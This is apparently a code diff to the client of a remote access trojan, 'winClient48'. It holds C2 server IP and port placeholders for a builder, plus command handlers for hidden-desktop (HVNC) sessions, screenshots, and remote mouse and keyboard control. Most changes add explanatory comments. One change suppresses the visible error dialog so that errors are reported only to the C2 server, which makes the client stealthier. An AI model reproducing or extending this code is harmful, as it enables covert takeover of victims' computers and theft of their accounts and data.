@@ -158,9 +158,9 @@ namespace winClient48
         //SOCKET CONNECTION
         private string ip = "[IP]";                          //C2 Server
         private int port = int.Parse("[PORT]");              //Port
-        private int time_reconnect = int.Parse("[RETRY]");   //1000; //ms
-        private int time_sendinfo = int.Parse("[INTERVAL]"); //1000; //ms
-        private int dwTimeout = int.Parse("[TIMEOUT]");      //100000; //ms
+        private int time_reconnect = int.Parse("[RETRY]");   //1000; ms
+        private int time_sendinfo = int.Parse("[INTERVAL]"); //1000; ms
+        private int dwTimeout = int.Parse("[TIMEOUT]");      //100000; ms
         private bool send_screen = true;                     //Capture screen
         private string id_prefix = "[PREFIX]";               //Client prefix
         private string id_hardware = string.Empty;           //Hardware ID
@@ -2986,8 +2986,12 @@ namespace winClient48
                 {
                     if (cmd[1] == "window")
                     {
+                        // Window command
+
                         if (cmd[2] == "init")
                         {
+                            // Initialization
+
                             List<List<string>> ls2d = new List<List<string>>();
                             foreach (var session in m_lsHVNC)
                                 ls2d.Add(new List<string>() { session.m_szDesktopName, session.m_bRunning ? "True" : "False" });
@@ -3010,6 +3014,8 @@ namespace winClient48
                         }
                         else if (cmd[2] == "sc")
                         {
+                            // Screenshot
+
                             string szName = cmd[3];
                             string szExe = cmd[4];
 
@@ -3054,6 +3060,8 @@ namespace winClient48
                         }
                         else if (cmd[2] == "start")
                         {
+                            // Start HVNC session
+
                             string szName = cmd[3];
                             string szExe = cmd[4];
                             int nDelay = int.Parse(cmd[5]);
@@ -3082,6 +3090,8 @@ namespace winClient48
                         }
                         else if (cmd[2] == "stop")
                         {
+                            // Stop HVNC session
+
                             string szName = cmd[3];
 
                             try
@@ -3116,6 +3126,8 @@ namespace winClient48
                         }
                         else if (cmd[2] == "close")
                         {
+                            // Close HVNC session
+
                             string szName = cmd[3];
                             int nDelay = int.Parse(cmd[4]);
 
@@ -3156,6 +3168,8 @@ namespace winClient48
                     }
                     else if (cmd[1] == "mouse")
                     {
+                        // HVNC mouse input
+
                         string szName = cmd[2]; // Desktop name
                         string action = cmd[3]; // "MOVE", "LD", "LU", etc.
                         int x = int.Parse(cmd[4]);
@@ -3173,6 +3187,8 @@ namespace winClient48
                     }
                     else if (cmd[1] == "keyboard")
                     {
+                        // HVNC keyboard input
+
                         string szName = cmd[2];
                         string action = cmd[3];
                         int vk = int.Parse(cmd[4]);
@@ -3192,7 +3208,7 @@ namespace winClient48
             }
             catch (Exception ex)
             {
-                MessageBox.Show(ex.Message, "winClient48");
+                //MessageBox.Show(ex.Message, "winClient48");
                 v.SendCommand($"error|{clsCrypto.b64E2Str(ex.Message)}");
             }
         }
